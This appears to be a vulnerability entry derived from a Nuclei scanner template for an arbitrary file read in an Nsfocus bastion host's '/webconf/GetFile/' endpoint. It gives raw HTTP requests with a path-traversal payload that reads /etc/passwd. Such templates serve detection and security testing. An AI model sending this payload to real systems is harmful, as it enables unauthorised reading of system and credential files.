# Vulnerability: Nsfocus - Arbitrary File Read
**Classification:** NSFOCUS
**Source:** Nuclei Template (`nsfocus-lfi.yaml`)

## Description
Nsfocus bastion has an Arbitrary File Read Vulnerability through '/webconf/GetFile/'.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /user/requireLogin HTTP/1.1
Host: {{Hostname}}

GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

